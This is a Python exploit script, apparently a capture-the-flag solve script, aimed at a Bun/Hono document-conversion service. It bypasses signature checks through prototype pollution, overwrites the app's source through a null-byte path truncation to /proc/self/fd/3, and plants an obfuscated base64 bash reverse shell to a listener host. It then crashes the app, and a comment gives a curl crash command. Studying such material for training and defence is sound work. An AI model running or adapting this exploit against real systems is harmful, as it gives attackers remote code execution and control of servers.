import argparse, base64, requests, os

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    parser.add_argument(
        'target',
        help='Base url to the instance'
    )

    parser.add_argument(
        'lhost',
        help='Listening IP to receive the reverse shell'
    )

    parser.add_argument(
        'lport',
        help='Port on listening host'
    )

    return parser.parse_args()

def main():
    args = parse_args()
    target = args.target
    lhost = args.lhost
    lport = args.lport

    ##
    # Step 1: Grab an example of a prisoner document with a signature
    ##
    r = requests.get(target + "/examples")
    base_payload = r.json()["examples"][0]

    ##
    # Step 2: Build the payload to overwrite /app/src/index.ts by /proc/self/fd/3 with RCE payload
    ##

    # Bypasses the signature verification by prototype poisoning
    base_payload["data"]["signed.__proto__"] = {
        # Bun does not handle null bytes in strings for filepaths correctly and truncates the filepath
        "outputPrefix": "../../proc/self/fd/3\0"
    }

    # Set RCE payload to satisfy YAML and TypeScript syntax
    cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    payload = {
        "data": {
            # This ordering is imporant so the parsed YAML is valid TypeScript syntax
            "const a": "string = Bun.spawnSync({cmd:[\"bash\",\"-c\", \"echo${IFS}" + base64.b64encode(cmd.encode()).decode() + "${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash${IFS}-i\"]});/*",
            **base_payload["data"],
            "z": "hi */"
        },
        "signature": base_payload["signature"]
    }

    r = requests.post(target + "/convert-to-yaml", json=payload)

    ##
    # Step 3: Crash the app by triggering unhandled exception using the following methods (there are probs a lot more):
    #
    # Method 1:
    #       Trigger an unhandled exception vuln in the bodyParse middleware in hono
    #           curl -F 'file=@/dev/urandom' -H 'Content-Type: application/json' -X POST {target}/convert-to-yaml
    #
    # Method 2:
    #       Cause the `open` syscall to fail in bun that causes the app to crash.
    #       This solve script uses this method
    #
    # Method 3:
    #       There are probably a lot more methods to cause an unhandled exception in hono or bun
    ##

    # Tbh I don't understand this payload and just stumbled across it while writing this solve script
    # Probs another bug within bun as well
    base_payload["data"]["signed.__proto__"]["outputPrefix"] = "../../proc/self/fd/3\\x"

    r = requests.post(target + "/convert-to-yaml", json=base_payload)

    # Profit?

if __name__ == "__main__":
    main()